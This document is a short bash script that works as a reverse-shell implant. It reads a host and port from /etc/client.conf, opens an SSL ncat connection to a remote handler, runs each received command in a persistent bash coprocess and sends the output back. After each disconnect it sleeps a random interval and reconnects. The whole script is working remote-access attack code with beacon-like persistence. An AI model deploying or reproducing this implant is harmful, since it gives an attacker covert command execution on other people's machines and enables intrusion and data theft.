#!/bin/bash

CONFIG="/etc/client.conf"
source "$CONFIG"

rand_wait() { shuf -i "${MIN_WAIT}-${MAX_WAIT}" -n 1; }

while true; do
    echo "[*] Connecting to $HOST:$PORT..."

    # Open persistent Bash shell (line-buffered)
    coproc SHELL_PROC (stdbuf -oL -eL bash --noprofile --norc)
    SHELL_IN=${SHELL_PROC[1]}
    SHELL_OUT=${SHELL_PROC[0]}
    SHELL_PID=${SHELL_PROC_PID}

    # Connect to handler using ncat
    coproc NCLIENT (ncat --ssl "$HOST" "$PORT")
    CLIENT_IN=${NCLIENT[1]}
    CLIENT_OUT=${NCLIENT[0]}
    NCLIENT_PID=${NCLIENT_PID}

    # Read commands from handler
    while IFS= read -r cmd <&"$CLIENT_OUT"; do
        [[ "$cmd" == "exit" ]] && break

        # Send command to persistent shell
        echo "$cmd; echo __END__" >&"$SHELL_IN"

        # Read shell output until sentinel and send back to handler
        while IFS= read -r line <&"$SHELL_OUT"; do
            [[ "$line" == "__END__" ]] && break
            echo "$line" >&"$CLIENT_IN"
        done
    done

    # Cleanup
    kill "$SHELL_PID" 2>/dev/null
    kill "$NCLIENT_PID" 2>/dev/null
    exec {SHELL_IN}>&-
    exec {SHELL_OUT}<&-
    exec {CLIENT_IN}>&-
    exec {CLIENT_OUT}<&-

    sleep $(rand_wait)
done
